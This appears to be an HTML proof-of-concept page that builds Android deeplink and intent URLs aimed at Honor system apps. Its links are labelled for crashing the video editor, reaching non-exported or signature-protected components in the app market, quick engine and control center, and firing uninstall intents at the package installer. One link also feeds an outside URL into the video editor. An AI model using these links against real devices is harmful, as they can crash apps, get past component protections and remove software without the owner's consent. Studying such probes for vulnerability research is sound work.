<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <title>DeepLink</title>
</head>
<body>
  <!-- 保留原本的第一个静态链接：点击打开主题管理器 -->
  <a href="intent://www.honor.com/theme?url=https://laisicheng.github.io/pages/thememanager_poc.html#Intent;scheme=hnt;package=com.hihonor.android.thememanager;component=com.hihonor.android.thememanager/.logic.link.ac.ThirdApiActivity;end">
    点击打开主题管理器
  </a>

  <script>
    // 1. JSON和编码
    var jsonObj = { "url": "https://lightpeanut.github.io/ShadowScripts/list_objects.html" };
    var json = JSON.stringify(jsonObj);
    var encodedJson = encodeURIComponent(json);

    // 2. 第一个链接：点击打开剪辑
    var intentUrl1 = "heditor://launch.cn/todocode?cd=21001&content=" + encodedJson;
    var link1 = document.createElement('a');
    link1.href = intentUrl1;
    link1.textContent = "点击打开剪辑（com.hihonor.videoeditor）";
    document.body.appendChild(link1);

    // 换行
    var br1 = document.createElement('br');
    document.body.appendChild(br1);

    // 3. 第二个链接：令剪辑崩溃
    var intentUrl2 = "heditor://launch.cn/todocode?cd=21001&content=a";
    var link2 = document.createElement('a');
    link2.href = intentUrl2;
    link2.textContent = "令剪辑崩溃（com.hihonor.videoeditor）";
    document.body.appendChild(link2);

    var br2 = document.createElement('br');
    document.body.appendChild(br2);

    // 4. gamecenter
    var intentUrl3 = "intent://contents#Intent;scheme=gamecenter;action=android.intent.action.VIEW;package=com.hihonor.gamecenter;end";
    var link3 = document.createElement('a');
    link3.href = intentUrl3;
    link3.textContent = "intentUri（com.hihonor.gamecenter）";
    document.body.appendChild(link3);

    var br3 = document.createElement('br');
    document.body.appendChild(br3);

    // 5. quickengine 无签名权限
    var intentUrl4 = "hnquickapp://permission_list_activity";
    var link4 = document.createElement('a');
    link4.href = intentUrl4;
    link4.textContent = "需要 signature 权限的 deeplink（com.hihonor.quickengine）";
    document.body.appendChild(link4);

    var br4 = document.createElement('br');
    document.body.appendChild(br4);

    // 6. quickengine2
    var intentUrl5 = "intent://permission_list_activity#Intent;scheme=hnquickapp;action=android.intent.action.VIEW;package=com.hihonor.quickengine;end";
    var link5 = document.createElement('a');
    link5.href = intentUrl5;
    link5.textContent = "需要 signature 权限的 intentUri（com.hihonor.quickengine2）";
    document.body.appendChild(link5);

    var br5 = document.createElement('br');
    document.body.appendChild(br5);

    // 7. quickengine3 export=false
    var intentUrl6 = "intent://anything#Intent;scheme=anything;action=org.hapjs.action.VIEW_ERROR;package=com.hihonor.quickengine;end";
    var link6 = document.createElement('a');
    link6.href = intentUrl6;
    link6.textContent = "export=false 的 intentUri（com.hihonor.quickengine3）";
    document.body.appendChild(link6);

    var br6 = document.createElement('br');
    document.body.appendChild(br6);

    // 8. appmarket export=false
    var intentUrl7 = "intent://#Intent;package=com.hihonor.appmarket;end";
    var link7 = document.createElement('a');
    link7.href = intentUrl7;
    link7.textContent = "export=false 的 intentUri（com.hihonor.appmarket）";
    document.body.appendChild(link7);

    var br7 = document.createElement('br');
    document.body.appendChild(br7);

    // 9. appmarket1
    var intentUrl8 = "intent://anything#Intent;scheme=anything;component=com.hihonor.appmarket/com.hihonor.appmarket.module.search.SearchAppActivity;end";
    var link8 = document.createElement('a');
    link8.href = intentUrl8;
    link8.textContent = "export=false 的 intentUri（com.hihonor.appmarket1）";
    document.body.appendChild(link8);

    var br8 = document.createElement('br');
    document.body.appendChild(br8);

    // 10. appmarket2
    var intentUrl9 = "intent://anything#Intent;scheme=anything;component=com.hihonor.appmarket/.module.search.SearchAppActivity;end";
    var link9 = document.createElement('a');
    link9.href = intentUrl9;
    link9.textContent = "export=false 的 intentUri（com.hihonor.appmarket2）";
    document.body.appendChild(link9);

    var br9 = document.createElement('br');
    document.body.appendChild(br9);

    // 11. appmarket3
    var intentUrl10 = "intent://anything#Intent;scheme=anything;component=com.hihonor.appmarket/.com.hihonor.appmarket.module.search.SearchAppActivity;end";
    var link10 = document.createElement('a');
    link10.href = intentUrl10;
    link10.textContent = "export=false 的 intentUri（com.hihonor.appmarket3）";
    document.body.appendChild(link10);

    var br10 = document.createElement('br');
    document.body.appendChild(br10);

    // 12. controlcenter
    var intentUrl11 = "intent://#Intent;component=com.hihonor.controlcenter/com.hihonor.appmarket.module.search.SearchAppActivity;package=com.hihonor.controlcenter";
    var link11 = document.createElement('a');
    link11.href = intentUrl11;
    link11.textContent = "export=false 的 intentUri（com.hihonor.controlcenter）";
    document.body.appendChild(link11);

    var br5 = document.createElement('br');
    document.body.appendChild(br5);

    var intentUrl13 = "intent://permission_list_activity#Intent;scheme=hnquickapp123;action=android.intent.action.VIEW;package=com.hihonor.quickengine;end";
    var link13 = document.createElement('a');
    link13.href = intentUrl13;
    link13.textContent = "需要 signature 权限的 intentUri（错误scheme）";
    document.body.appendChild(link13);

    var br5 = document.createElement('br');
    document.body.appendChild(br5);
    
    var intentUrl14 = "intent://#Intent;scheme=package;action=android.intent.action.DELETE;package=com.android.packageinstaller;end";
    var link14 = document.createElement('a');
    link14.href = intentUrl14;
    link14.textContent = "需要 signature 权限的 intentUri（uninstall1）";
    document.body.appendChild(link14);

    var br5 = document.createElement('br');
    document.body.appendChild(br5);
    
    var intentUrl15 = "intent://any#Intent;scheme=package;action=android.intent.action.DELETE;package=com.android.packageinstaller;end";
    var link15 = document.createElement('a');
    link15.href = intentUrl15;
    link15.textContent = "需要 signature 权限的 intentUri（uninstall2）";
    document.body.appendChild(link15);

    
    var br5 = document.createElement('br');
    document.body.appendChild(br5);

    var intentUrl16 = "intent://uninstallPlaceholder#Intent;action=android.intent.action.DELETE;data=package:com.example.foo;end";
    var link16 = document.createElement('a');
    link16.href = intentUrl16;
    link16.textContent = "需要 signature 权限的 intentUri（uninstall3）";
    document.body.appendChild(link16);

    var intentUrl17 = "intent://uninstallPlaceholder#Intent;scheme=package;action=android.intent.action.INSTALL_PACKAGE;data=package://com.example.foo;package=com.android.packageinstaller;end";
    var link17 = document.createElement('a');
    link17.href = intentUrl17;
    link17.textContent = "需要 signature 权限的 intentUri（uninstall4）";
    document.body.appendChild(link17);

    
    var intentUrl18 = "intent:#Intent;SEL;S.com.android.packageinstaller.applicationInfo=abcdef;component=com.android.packageinstaller/com.android.packageinstaller.Uninstalling;end";
    var link18 = document.createElement('a');
    link18.href = intentUrl18;
    link18.textContent = "需要 signature 权限的 intentUri（uninstall8）";
    document.body.appendChild(link18);

    var intentUrl19 = "intent:#Intent;component=com.android.packageinstaller/com.hihonor.packageinstaller.hncust.deletepkgs.UninstallPackagesActivity;end";
    var link19 = document.createElement('a');
    link19.href = intentUrl19;
    link19.textContent = "需要 signature 权限的 intentUri（uninstall10）";
    document.body.appendChild(link19);

    
  </script>
</body>
</html>
